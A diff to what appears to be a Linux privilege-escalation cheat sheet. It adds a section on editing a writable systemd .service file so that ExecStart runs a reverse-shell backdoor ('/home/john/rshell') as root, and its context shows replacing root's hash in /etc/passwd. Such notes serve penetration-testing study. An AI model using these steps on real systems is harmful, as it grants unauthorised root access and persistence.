@@ -719,6 +719,39 @@ Replace root password hash
 1. Kali: generate a password `openssl passwd hacker123` and obtain a password hash.
 2. Target: replace root password `x` in `/etc/passwd` file with password hash i.e. `root:<has>:0:0:----`
 
+### Writable .Service Files
+
+Check if you can write any .service file, if you can, you could modify it so it executes your backdoor when the service is started, restarted or stopped.
+```bash
+# check contents of .Service file
+$ cat /etc/systemd/system/app.Service
+[Unit]
+Description=Python App
+After=network-online.target
+[Service]
+Type=simple
+WorkingDirectory=/home/john/app
+ExecStart=flask run -h 0.0.0.0 -p 50000
+TimeoutSec=30
+RestartSec=15s
+User=john
+ExecReload=/bin/kill -USR1 $MAINPID
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+
+# change configuration
+(remote)WorkingDirectory=XXX
+ExecStart=/home/john/rshell
+User=root
+
+# restart host or service
+$ sudo reboot
+$ service xxx restart
+```
+
+
 
 ### MySQL User-Defined-Functions (UDF)
 
